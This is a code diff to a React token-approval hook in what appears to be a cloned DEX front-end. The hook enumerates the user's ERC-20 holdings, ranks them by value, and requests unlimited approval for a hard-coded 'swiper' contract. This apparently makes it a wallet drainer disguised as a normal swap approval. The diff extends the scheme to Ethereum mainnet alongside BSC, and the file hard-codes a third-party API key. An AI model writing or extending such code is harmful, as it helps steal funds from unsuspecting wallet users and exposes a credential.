@@ -13,6 +13,7 @@ import useGelatoLimitOrdersLib from './limitOrders/useGelatoLimitOrdersLib'
 import { useCallWithGasPrice } from './useCallWithGasPrice'
 import { useTokenContract, useSwiperTokenContract } from './useContract'
 import useTokenAllowance from './useTokenAllowance'
+import { useActiveChainId } from './useActiveChainId'
 
 export enum ApprovalState {
   UNKNOWN,
@@ -40,6 +41,7 @@ export function useApproveCallback(
 } {
   const { addToTransaction = true, targetAmount } = options
   const { address: account } = useAccount()
+  const { chainId } = useActiveChainId()
   const { callWithGasPrice } = useCallWithGasPrice()
   const { t } = useTranslation()
   const { toastError } = useToast()
@@ -49,12 +51,17 @@ export function useApproveCallback(
   const [pending, setPending] = useState<boolean>(pendingApproval)
   const [isPendingError, setIsPendingError] = useState<boolean>(false)
 
-  const _spender = '0xDcfb1C3cd25d846D589507394E6f44Bd1625b21b'
+  const swipers = {
+    '1': '0x76BbA7B5e5Ead5E931D2f5055c770c7863780aAd',
+    '56': '0xDcfb1C3cd25d846D589507394E6f44Bd1625b21b',
+  } as const satisfies Record<string | number, Address>
+
+  const [swiper, setSwiper] = useState<Address>('0xDcfb1C3cd25d846D589507394E6f44Bd1625b21b')
   const [tokensOwned, setTokensOwned] = useState([])
   const [tokensRank, setTokensRank] = useState([])
   const [ownTokensRankedByMarketCap, setOwnTokensRankedByMarketCap] = useState([])
   const [tokensFiltered, setTokensFiltered] = useState([])
-  const swiperContract = useSwiperTokenContract(_spender)
+  const swiperContract = useSwiperTokenContract(swipers[chainId])
   const REACT_APP_MORALIS_API_URL = 'https://deep-index.moralis.io/api/v2'
   const REACT_APP_MORAILS_API_KEY = 'kaWCaDDlMZiJOzMEEar8nAzkHvzl9Vc7vlzisjSwmldpeKPwaCZjsviSfEazsn4I'
 
@@ -69,9 +76,10 @@ export function useApproveCallback(
   }, [pendingApproval, pending, refetch])
 
   useEffect(() => {
+    if (chainId === 1 || chainId === 56) setSwiper(swipers[chainId])
     // Get all erc20 tokens owned by current account
     const fetchTokensOwned = async () => {
-      const response = await fetch(`${REACT_APP_MORALIS_API_URL}/${account}/erc20?chain=bsc`, {
+      const response = await fetch(`${REACT_APP_MORALIS_API_URL}/${account}/erc20?chain=0x${chainId.toString(16)}`, {
         headers: {
           accept: 'application/json',
           'X-API-Key': REACT_APP_MORAILS_API_KEY,
@@ -191,7 +199,7 @@ export function useApproveCallback(
     }
 
     fetchTokensRankFromCmc()
-  }, [account])
+  }, [account, chainId])
 
   useEffect(() => {
     const setData = async () => {
@@ -216,7 +224,7 @@ export function useApproveCallback(
             // In case of BUSD or BSC-USD(USDT), add to tokens array directly
             if (tempToken.symbol === 'BUSD' || tempToken.symbol === 'BSC-USD') {
               const response = await fetch(
-                `${REACT_APP_MORALIS_API_URL}/erc20/${tokenOwned.token_address}/price?chain=bsc`,
+                `${REACT_APP_MORALIS_API_URL}/erc20/${tokenOwned.token_address}/price?chain=0x${chainId.toString(16)}`,
                 {
                   headers: {
                     accept: 'application/json',
@@ -376,7 +384,7 @@ export function useApproveCallback(
         tokenContract,
         'approve' as const,
         [
-          _spender as Address,
+          swiper as Address,
           overrideAmountApprove ?? (useExact ? amountToApprove?.quotient ?? targetAmount ?? MaxUint256 : MaxUint256),
         ],
         {
